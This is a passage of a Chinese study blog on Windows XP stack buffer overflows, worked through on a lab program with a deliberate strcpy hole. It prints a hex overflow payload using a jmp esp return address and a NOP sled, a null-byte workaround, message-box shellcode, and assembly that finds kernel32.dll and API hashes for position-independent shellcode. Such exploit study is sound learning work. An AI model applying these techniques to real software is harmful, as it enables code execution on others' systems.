-<h4 id="jmp-esp之后"><a href="#jmp-esp之后" class="headerlink" title="jmp esp之后"></a>jmp esp之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917105357095.png" alt="image-20220917105357095"></p>
-<p>控制已经转移到0x12F828</p>
-<p>call eax之后,竟然是一个add ah,cl,然后紧跟着就是一大片int 3中断指令,不是预期的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax,<span class="number">0x77E55CB5</span></span><br><span class="line">call eax <span class="comment">// call exit(0)</span></span><br></pre></td></tr></table></figure>
-
-<p>在执行完add ah,cl之后,控制到达0x12FB49位置,这时候程序就会报告0x80000003号错误了</p>
-<p>检查了一圈发现原来是忘记拷贝这两条指令的机器码了,绷不住了</p>
-<p>改正后的password.txt</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41</span><br><span class="line">41 41 41 41 4A 75 D4 77 66 81 EC 40 04 33 DB 53</span><br><span class="line">68 77 65 73 74 68 66 61 69 6C 8B C4 53 50 50 53</span><br><span class="line">B8 D7 AD D3 77 FF D0 53 B8 B5 5C E5 77 FF D0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>用这个password.txt作为负载就打通了,并且程序能够全身而退不报错</p>
-<h2 id="扩大靶面积"><a href="#扩大靶面积" class="headerlink" title="扩大靶面积"></a>扩大靶面积</h2><h3 id="shellcode放在那里"><a href="#shellcode放在那里" class="headerlink" title="shellcode放在那里?"></a>shellcode放在那里?</h3><p>第二章将shellcode直接写入buffer中,有被再次长起来的堆栈覆盖的风险</p>
-<p>本章的方法直接将shellcode藏到ESP的头上,ESP只会向下长,就不用担心shellcode被覆盖了</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917111521845.png" alt="image-20220917111521845"></p>
-<p>如果buffer足够大,远远不用担心堆栈长起来复仇,则可以使用2.4的方法.</p>
-<p>2.4的方法相对于3.2的方法,其好处是溢出只发生于被调用者栈帧,shellcode执行完之后比较容易归还控制,还原寄存器</p>
-<p>但是3.2的实验,往调用者栈帧溢出,就不容易归还控制和寄存器了</p>
-<p>但是2.4的缺点是,溢出返回地址时使用的是堆栈的绝对地址,而不同操作系统上可能堆栈位置会发生变化,因此适用性差</p>
-<h3 id="折中方案"><a href="#折中方案" class="headerlink" title="折中方案"></a>折中方案</h3><p>有一个集合两个方法有点的方法,</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917112905475.png" alt="image-20220917112905475"></p>
-<p>啥意思呢?</p>
-<p>将返回地址还是溢出成一条jmp esp的地址,但是紧跟在返回地址之前,也就是返回后esp指向的地址,不直接放shellcode,而是放一条相对跳转.跳回到”被调用者栈帧”(加引号是因为返回后被调用者栈帧已经扬了,只不过原来写到上面的东西都还没擦)</p>
-<p>而shellcode早已放在被调用者栈帧的buffer中了</p>
-<p>这种方法还是有shellcode被再次长起来的堆栈覆盖的风险</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917113049128.png" alt="image-20220917113049128"></p>
-<h3 id="预防堆栈覆盖shellcode"><a href="#预防堆栈覆盖shellcode" class="headerlink" title="预防堆栈覆盖shellcode"></a>预防堆栈覆盖shellcode</h3><p>但是有对策,在shellcode一开始先让栈顶下降到shellcode以下,保证堆栈再怎么长都和shellcode无关</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917113652524.png" alt="image-20220917113652524"></p>
-<h3 id="x是多少-扩大靶面积"><a href="#x是多少-扩大靶面积" class="headerlink" title="x是多少?扩大靶面积"></a>x是多少?扩大靶面积</h3><p>还有一个问题,x是多少呢?</p>
-<p>buffer与retn之后的esp的距离,一定就是常数x吗?</p>
-<p>也不一定,考虑对齐,优化各种因素,x可能会变</p>
-<p>那么怎么准确的让jmp esp-x这条指令能够跳转到shellcode中呢?</p>
-<p>如果buffer足够大,可以在其一开始填充很多nop(0x90)指令,啥也不干,但是eip会向高地址端移动</p>
-<p>然后在buffer较高的地方放置shellcode,这样jmp esp-x,不管x是多少,只要能跳到那一大堆nop中的任意一条,就可以执行shellcode</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917144909728.png" alt="image-20220917144909728"></p>
-<h3 id="实验验证"><a href="#实验验证" class="headerlink" title="实验验证"></a>实验验证</h3><p>实验验证刚才这几点</p>
-<p>可以利用的程序,其中verify_password的缓冲区buffer从44字节扩大到200字节,目的是一开始可以填充很多nop</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//确保可以调用windows API </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span><span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> authenticated;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">200</span>];<span class="comment">//缓冲区扩大到200个字节,方便容纳nop和shellcode</span></span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password, PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, password); <span class="comment">// over flowed here!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>); <span class="comment">// prepare for messagebox</span></span><br><span class="line">    <span class="keyword">if</span> (!(fp = fopen(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line">    valid_flag = verify_password(password);</span><br><span class="line">    <span class="keyword">if</span> (valid_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>首先调试观察verify_password函数栈帧</p>
-<h4 id="buffer的位置"><a href="#buffer的位置" class="headerlink" title="buffer的位置"></a>buffer的位置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">13:       strcpy(buffer, password); // over flowed here!</span><br><span class="line">00401052   mov         ecx,dword ptr [ebp+8]</span><br><span class="line">00401055   push        ecx</span><br><span class="line">00401056   lea         edx,[ebp-0CCh]</span><br><span class="line">0040105C   push        edx</span><br><span class="line">0040105D   call        strcpy (004011b0)</span><br><span class="line">00401062   add         esp,8</span><br></pre></td></tr></table></figure>
-
-
-
-<p>buffer位于ebp-0x0CCh处,在windows XP上调试时,ebp&#x3D;0x0012FB20</p>
-<p>栈帧长这样,(奇了怪了buffer总是贴着authenticated长)</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917150018794.png" alt="image-20220917150018794"></p>
-<h4 id="shellcode咋写"><a href="#shellcode咋写" class="headerlink" title="shellcode咋写"></a>shellcode咋写</h4><p>将buffer的前100个字节全都用nop(0x90)填充,然后放shellcode,这是139个字节了,</p>
-<p>然后再填充69个字节,到返回地址家门口,此时已有208个字节,</p>
-<p>从user32.dll中”借一个”jmp esp,地址为0x77D4754A,此时已有20C个字节,</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917103921056.png" alt="一定要注意字节序"></p>
-<p>然后在retn后的esp位置放一条jmp esp-x指令,注意这里是指令的机器码,不是指令的地址,</p>
-<p>这里x可以是多少呢?</p>
-<p>0x60-0xD4之间均可</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917150804610.png" alt="image-20220917150804610"></p>
-<p>不妨娶一个x&#x3D;0xA0,</p>
-<p>如果把jmp esp-0xA0拆成两条指令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub esp,0xA0</span><br><span class="line">jmp esp</span><br></pre></td></tr></table></figure>
-
-<p>机器码为<code>81 EC A0 00 00 00 FF E4</code></p>
-<blockquote>
-<p>直接在这里将栈顶下降到shellcode正文的基地址处,就免去了shellcode一开始再下降栈顶了</p>
-<p>当然shellcode中再让栈顶往下个十万八千里也不是不行</p>
-</blockquote>
-<p>到此password.txt长这样</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917155237143.png" alt="image-20220917155237143"></p>
-<p>最后这里就有问题了,81 EC A0 00 00 00是sub esp,0xA0的机器码,</p>
-<p>A0 00 00 00是立即数,其中包含00了,在strcpy的时候会被截断,导致后面的FF E4无法拷贝到buffer中.</p>
-<h4 id="有00咋办"><a href="#有00咋办" class="headerlink" title="有00咋办"></a>有00咋办</h4><p>这咋办呢?要从指令上做文章了</p>
-<p>首先,esp-0xA0,实际上和sp-0xA0效果相同,但是sp是一个字寄存器,esp是一个双字寄存器,</p>
-<p>sub sp,0xA0的立即数更短,但是立即数0x00A0高一个字节仍然是00,还是白搭</p>
-<blockquote>
-<p>我试图用sub spl,0xA0,只用sp寄存器的最低规格,但是编译器报错说没有spl这个标号,也就是说最低最低能够操作的就是sp寄存器了</p>
-</blockquote>
-<p>考虑到减一个正数,相当于加它的相反数,那么sub sp,0xA0就等于add sp,0xFF60</p>
-<p>这就没有00了</p>
-<table>
-<thead>
-<tr>
-<th>指令</th>
-<th>机器码</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>add sp,0xFF60</td>
-<td>66 81 C4 60 FF 90</td>
-</tr>
-<tr>
-<td>jmp esp</td>
-<td>FF E4</td>
-</tr>
-</tbody></table>
-<p>正好八个字节,相当于覆盖了一个参数还有main栈帧顶的4个字节,不是很严重,肯定没有覆盖main函数的返回值</p>
-<p>到此password.txt长这样</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917160832220.png" alt="没有任何一个字节是00"></p>
-<p>放到windows XP上试一试</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917160931645.png" alt="通了"></p>
-<h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><h4 id="strcpy之后"><a href="#strcpy之后" class="headerlink" title="strcpy之后"></a>strcpy之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917162316226.png" alt="image-20220917162316226"></p>
-<p>shellcode已经写入了</p>
-<p>0x12FB24存储的返回地址已经被覆盖为0x77D47754A</p>
-<h4 id="retn之后-1"><a href="#retn之后-1" class="headerlink" title="retn之后"></a>retn之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917162545781.png" alt="image-20220917162545781"></p>
-<p>跳转到jmp esp指令的地址,此时esp指向0x12FB28,对应抬栈跳转两条指令(中间填了一个nop(0x90))</p>
-<h4 id="第一个jmp-esp之后"><a href="#第一个jmp-esp之后" class="headerlink" title="第一个jmp esp之后"></a>第一个jmp esp之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917162846919.png" alt="image-20220917162846919"></p>
-<p>抬栈之后esp&#x3D;0x12FA88,这里上下都是0x90,全是nop,然后马上就要一个jmp esp跳进来</p>
-<h4 id="第二个jmp-esp之后"><a href="#第二个jmp-esp之后" class="headerlink" title="第二个jmp esp之后"></a>第二个jmp esp之后</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917163016363.png" alt="image-20220917163016363"></p>
-<p>此后eip将沿着0x12FA88-&gt;0x12FA89这个增大的方向进展</p>
-<p>在0x12FAB8处将会碰见第一条有意义的指令,抬栈1234h,显然这是不必要的,因为第二个jmp esp之前,已经把esp放到不会影响shellcode的位置了</p>
-<h2 id="通用shellcode"><a href="#通用shellcode" class="headerlink" title="通用shellcode"></a>通用shellcode</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h4 id="动态定位库函数的方法"><a href="#动态定位库函数的方法" class="headerlink" title="动态定位库函数的方法"></a>动态定位库函数的方法</h4><p>前面的方法仍然不是通用的,不同的操作系统上,user32.dll库的地址是可变的,其中函数的地址自然也是可变的,而我们在寻找第一个jmp esp时使用了库函数的绝对地址.</p>
-<p>这就是局限性的根源所在</p>
-<p>要克服这个局限性,必须在shellcode运行时,动态地寻找目的函数或者目的指令,而不是我们亲自找了给他写死</p>
-<p>在win32平台下,动态定位kernel32.dll中函数地址的方法是这样的:</p>
-<p>1.FS段选择子会指向全局段描述表中本程序的TEB描述符,通过TEB描述符中的基地址可以查到内存中的TEB表</p>
-<blockquote>
-<p>TEB,thread environment block,线程环境块,存放进程中的线程信息,一个进程中的每个线程都会有一个TEB,每个进程自己会有一个PEB</p>
-</blockquote>
-<p>2.TEB表的0x30偏移处,存放着PEB的指针</p>
-<p>3.PEB表的0x0C偏移处,存放着PEB_LDR_DATA结构体的指针</p>
-<p>4.PEB_LDR_DATA结构体的0x1C偏移处,存放着InInitializationOrderModuleList指针</p>
-<blockquote>
-<p>InInitializationOrderModuleList,模块初始化<strong>链表</strong></p>
-</blockquote>
-<p>5.InInitializationOrderModuleList表中,按顺序存放着本程序运行时装载的模块信息,第一个结点是ntdll.dll的信息,第二个结点是kernel32.dll的信息</p>
-<p>6.kernel32.dll结点中,偏移量为0x08处就是kernel32.dll的内存基地址指针</p>
-<p>7.kernel32.dll的基地址加上0x3C是kernel32.dll的PE头</p>
-<p>8.kernel32.dll的PE头的0x78偏移处,存放函数导出表指针</p>
-<p>9.在导出表中:</p>
-<p>导出表的0x1C偏移处,存放导出函数偏移地址(RVA)列表的指针</p>
-<p>导出表的0x20偏移处,存放导出函数函数名列表的指针</p>
-<p>一个导出函数在函数名表和导出地址表中的下标是相同的,用函数名查函数名表获得下标,然后用下标查导出地址表,就可以获得函数地址(RVA)</p>
-<p>RVA(function)+ImageBase(kernel32.dll)&#x3D;VA(function),这里kernel32.dll的映像基址已经在第6步获得了</p>
-<p>在kernel32.dll中找到LoadLibrary和GetProcAddress两个函数之后,就可以无脑调用函数来获取库函数地址了,不用再经历1-9的步骤了</p>
-<p>从图上看这个过程,能画出这个图来的老师儿也针的绝了</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" alt="md,绝了"></p>
-<h4 id="shellcode-开发环境"><a href="#shellcode-开发环境" class="headerlink" title="shellcode 开发环境"></a>shellcode 开发环境</h4><p>最方便的shellcode开发方法是使用内联汇编</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\x66\x81\xEC\x40\x04\x33\xDB……&quot;</span>; <span class="comment">//欲调试的十六</span></span><br><span class="line">                                                     <span class="comment">//进制机器码&quot;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123; </span><br><span class="line">        lea eax, shellcode</span><br><span class="line">        push eax</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如此可以很方便地将控制转移到shellcode中</p>
-<p>比如测试弹窗的shellcode</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] =</span><br><span class="line">    <span class="comment">//&quot;\x66\x81\xEC\x40\x04&quot; // SUB SP,440</span></span><br><span class="line">    <span class="string">&quot;\x33\xDB&quot;</span>             <span class="comment">// XOR EBX,EBX</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span>                 <span class="comment">// PUSH EBX</span></span><br><span class="line">    <span class="string">&quot;\x68\x77\x65\x73\x74&quot;</span> <span class="comment">// PUSH 74736577</span></span><br><span class="line">    <span class="string">&quot;\x68\x66\x61\x69\x6C&quot;</span> <span class="comment">// PUSH 6C696166</span></span><br><span class="line">    <span class="string">&quot;\x8B\xC4&quot;</span>             <span class="comment">// MOV EAX,ESP</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span>                 <span class="comment">// PUSH EBX</span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>                 <span class="comment">// PUSH EAX</span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>                 <span class="comment">// PUSH EAX</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span>                 <span class="comment">// PUSH EBX</span></span><br><span class="line">    <span class="string">&quot;\xB8\xD7\xAD\xD3\x77&quot;</span> <span class="comment">// MOV EAX,user32.MessageBoxA//function address varies between os</span></span><br><span class="line">    <span class="string">&quot;\xFF\xD0&quot;</span>             <span class="comment">// CALL EAX</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span>                 <span class="comment">// PUSH EBX ;/ExitCode</span></span><br><span class="line">    <span class="string">&quot;\xB8\xB5\x5C\xE5\x77&quot;</span> <span class="comment">// MOV EAX,kernel32.ExitProcess</span></span><br><span class="line">    <span class="string">&quot;\xFF\xD0&quot;</span>;            <span class="comment">// CALL EAX ;\ExitProcess</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hmod=LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);<span class="comment">//to ensure user32.dll is loaded </span></span><br><span class="line">    <span class="keyword">if</span>(!hmod)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;load failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __asm</span><br><span class="line">    &#123; </span><br><span class="line">        lea eax, shellcode</span><br><span class="line">        push eax</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917174306682.png" alt="image-20220917174306682"></p>
-<h4 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h4><p>shellcode讲究一个短小精悍,如果为了找一个库函数,把它的名字比如”MessageBoxA”完整地放到shellcode中,自然不愿意.</p>
-<p>要是shellcode的空间有限,光一个函数名就可以占用很大空间,可能就没有足够的地方做完剩下的逻辑了</p>
-<p>因此采用哈希算法处理函数名,</p>
-<p>我们想要的函数名哈希一下,遍历库函数时每个函数名都哈希一下,和我们自己的哈希值比划比划,要是一样就认为找到了目标函数</p>
-<p>书上采用的哈希算法为:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">GetHash</span><span class="params">(<span class="type">char</span> *fun_name)</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD digest = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*fun_name)</span><br><span class="line">    &#123;</span><br><span class="line">        digest = ((digest &lt;&lt; <span class="number">25</span>) | (digest &gt;&gt; <span class="number">7</span>)); <span class="comment">//循环右移 7 位</span></span><br><span class="line">        digest += *fun_name;                       <span class="comment">//累加</span></span><br><span class="line">        fun_name++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> digest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>每次循环右移7位然后加上函数名的一个字节,直到遍历函数名到NULL,算法结束,返回digest摘要值</p>
-<p>这样哈希算法的返回值是一个DWORD双字,比较两个双字只需要一条指令,cmp a,b就可以了</p>
-<p>用该哈希函数得到的摘要值:</p>
-<table>
-<thead>
-<tr>
-<th>函数名</th>
-<th>摘要值(Hex)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>MessageBoxA</td>
-<td>1e380a6a</td>
-</tr>
-<tr>
-<td>LoadLibraryA</td>
-<td>c917432</td>
-</tr>
-<tr>
-<td>ExitProcess</td>
-<td>4fd18963</td>
-</tr>
-</tbody></table>
-<p>好了,现在会做1+1&#x3D;2了,下面解一道考研高数题</p>
-<h3 id="shellcode动态定位API"><a href="#shellcode动态定位API" class="headerlink" title="shellcode动态定位API"></a>shellcode动态定位API</h3><p>分析一下书上给出的shellcode代码都是干了啥</p>
-<h4 id="初始化-放置需要查找的函数"><a href="#初始化-放置需要查找的函数" class="headerlink" title="初始化,放置需要查找的函数"></a>初始化,放置需要查找的函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nop</span><br><span class="line">nop</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">nop</span><br><span class="line">nop ;为了便于观察,shellcode的开头结尾都放几个nop</span><br><span class="line">nop</span><br><span class="line">CLD					; clear flag DF,改变串操作的方向,保证在执行shellcode时是正方向的</span><br><span class="line">;store hash</span><br><span class="line">push 0x1e380a6a		;hash of MessageBoxA</span><br><span class="line">push 0x4fd18963		;hash of ExitProcess</span><br><span class="line">push 0x0c917432		;hash of LoadLibraryA</span><br><span class="line">mov esi,esp			; esi = addr of first function hash </span><br><span class="line">lea edi,[esi-0xc]	; edi = addr to start writing function </span><br></pre></td></tr></table></figure>
-
-<p>这一坨执行完毕后栈帧的状态</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917184259697.png" alt="image-20220917184259697"></p>
-<h4 id="抬栈"><a href="#抬栈" class="headerlink" title="抬栈"></a>抬栈</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; make some stack space</span><br><span class="line">xor ebx,ebx ;ebx置空</span><br><span class="line">mov bh, 0x04 		;ebx=0x400;	 </span><br><span class="line">sub esp, ebx    ;栈顶下降0x400个字节;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917190658920.png" alt="image-20220917190658920"></p>
-<h4 id="“user32”压栈"><a href="#“user32”压栈" class="headerlink" title="“user32”压栈"></a>“user32”压栈</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; push a pointer to &quot;user32&quot; onto stack </span><br><span class="line">mov bx, 0x3233 		; rest of ebx is null &quot;32&quot;</span><br><span class="line">push ebx    ;0x3233压栈</span><br><span class="line">push 0x72657375     ;&quot;user&quot;</span><br><span class="line">push esp </span><br><span class="line"></span><br><span class="line">xor edx,edx	;edx=0</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917191100826.png" alt="image-20220917191100826"></p>
-<h4 id="寻找kernel32-dll基地址"><a href="#寻找kernel32-dll基地址" class="headerlink" title="寻找kernel32.dll基地址"></a>寻找kernel32.dll基地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; find base addr of kernel32.dll </span><br><span class="line">	mov ebx, fs:[edx + 0x30] 	; ebx = address of PEB </span><br><span class="line">	mov ecx, [ebx + 0x0c] 		; ecx = pointer to loader data </span><br><span class="line">	mov ecx, [ecx + 0x1c] 		; ecx = first entry in initialisation order list </span><br><span class="line">	mov ecx, [ecx] 				; ecx = second entry in list (kernel32.dll) </span><br><span class="line">	mov ebp, [ecx + 0x08] 		; ebp = base address of kernel32.dll </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917170156956.png" alt="依据"></p>
-<h4 id="最外圈循环-寻找下一个库函数"><a href="#最外圈循环-寻找下一个库函数" class="headerlink" title="最外圈循环,寻找下一个库函数"></a>最外圈循环,寻找下一个库函数</h4><p>在执行本部分之前,esi在栈中的指向如图</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917191632775.png" alt="image-20220917191632775"></p>
